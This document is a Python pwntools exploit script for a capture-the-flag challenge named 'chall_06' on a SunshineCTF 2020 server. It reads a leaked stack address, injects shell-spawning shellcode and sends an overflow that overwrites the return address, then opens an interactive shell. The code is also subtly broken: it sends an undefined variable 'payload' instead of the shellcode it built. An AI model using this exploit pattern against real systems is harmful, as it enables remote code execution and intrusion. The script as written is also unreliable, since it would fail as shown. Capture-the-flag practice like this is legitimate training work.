from pwn import *

binary = context.binary = ELF('./chall_06')

p = remote('chal.2020.sunshinectf.org',30006)
p.recvuntil('Letting my armor fall again: ')

shelladdr = int(p.recvline().strip(),16)
shellpayload = b''
shellpayload += asm(shellcraft.sh())
p.sendline(payload)

payloadPadding = b'a' * (0x48 - 0x10)
payloadPadding += p64(shelladdr)
p.sendline(payloadPadding)
p.interactive()

